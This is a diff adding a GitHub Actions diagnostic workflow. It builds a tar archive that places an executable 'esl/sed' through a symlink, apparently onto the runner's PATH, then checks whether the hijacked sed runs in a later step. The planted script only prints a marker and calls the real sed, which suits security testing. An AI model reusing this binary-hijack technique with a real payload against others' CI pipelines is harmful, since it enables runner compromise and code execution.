@@ -1,0 +1,30 @@
+name: diag
+on: workflow_dispatch
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+        with:
+          ref: attack
+      - name: show symlinks
+        run: |
+          ls -la esl esc escx
+          readlink -f esl
+          tar --version | head -1
+      - name: tar without dir entries
+        run: |
+          python3 - <<'PY'
+          import tarfile, io
+          t = tarfile.open('d.tar','w')
+          data = b'#!/bin/sh\necho "[DIAG] hijacked sed ran" >&2\nexec /usr/bin/sed "$@"\n'
+          i = tarfile.TarInfo('esl/sed'); i.size=len(data); i.mode=0o755
+          t.addfile(i, io.BytesIO(data))
+          t.close()
+          PY
+          tar -xvf d.tar
+          ls -la /home/runner/.local/bin/ || true
+      - name: does sed hijack take effect in next step
+        run: |
+          echo hello > f.txt
+          sed 's/hello/DIAG-SED-REPLACED/' f.txt
